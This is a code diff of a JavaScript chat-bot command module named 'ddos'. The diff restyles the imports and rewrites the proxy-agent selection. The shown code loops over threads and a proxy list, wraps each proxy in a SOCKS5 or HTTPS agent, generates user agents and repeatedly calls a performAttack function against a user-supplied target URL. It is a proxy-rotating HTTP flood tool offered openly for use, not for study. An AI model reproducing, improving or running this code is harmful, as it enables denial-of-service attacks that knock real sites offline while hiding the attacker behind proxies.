@@ -1,17 +1,11 @@
 const axios = require("axios");
 const fs = require("fs");
 const path = require("path");
-const {
-    SocksProxyAgent
-} = require("socks-proxy-agent");
-const {
-    HttpsProxyAgent
-} = require("https-proxy-agent");
-const {
-    generateUserAgent
-} = require("../system/useragent.js");
+const SocksProxyAgent = require("socks-proxy-agent");
+const HttpsProxyAgent = require("https-proxy-agent");
+const { generateUserAgent } = require("../system/useragent.js");
 
-module.exports.config = {
+module.exports["config"] = {
     name: "ddos",
     type: "tools",
     role: 3,
@@ -103,7 +97,7 @@ const performAttack = (url, agent, headers, onComplete) => {
     });
 };
 
-module.exports.run = async ({
+module.exports["run"] = async ({
     args,
     chat,
     font
@@ -135,10 +129,14 @@ module.exports.run = async ({
 
     for (let i = 0; i < numThreads; i++) {
         for (const proxy of proxies) {
-            const [host,
-                port] = proxy.split(":");
-            const agent = host.startsWith("socks")
-            ? new SocksProxyAgent(`socks5://${host}:${port}`): new HttpsProxyAgent(`http://${host}:${port}`);
+            const [host, port] = proxy.split(":");
+            let agent;
+
+            if (host.startsWith("socks")) {
+                agent = new SocksProxyAgent(`socks5://${host}:${port}`);
+            } else {
+                agent = new HttpsProxyAgent(`http://${host}:${port}`);
+            }
 
             performAttack(targetUrl, agent, headers, () => (continueAttack = false));
         }
